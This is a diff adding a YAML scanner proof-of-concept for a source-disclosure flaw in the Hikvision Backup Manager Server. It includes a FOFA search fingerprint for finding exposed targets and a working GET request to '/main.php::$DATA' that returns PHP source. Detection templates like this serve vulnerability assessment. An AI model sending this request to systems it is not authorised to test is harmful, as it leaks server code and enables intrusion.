@@ -1,0 +1,20 @@
+id: poc-yaml-hikvision-backup-manager-server-file-read
+info:
+  name: 海康威视 备份管理服务器 文件读取漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: 海康威视-备份管理服务器
+  fofa: app="HIKVISION-备份管理服务器"
+requests:
+- method: GET
+  path: /main.php::$DATA
+  headers:
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+  expression: "status_code == 200 && \ncontains(body,\"备份管理服务器\") && \ncontains(body,\"\
+    userName\") &&\ncontains(body,\"session_start\") &&\ncontains(body,\"hikvision\"\
+    )\n"
+variables: {}
+transport: http
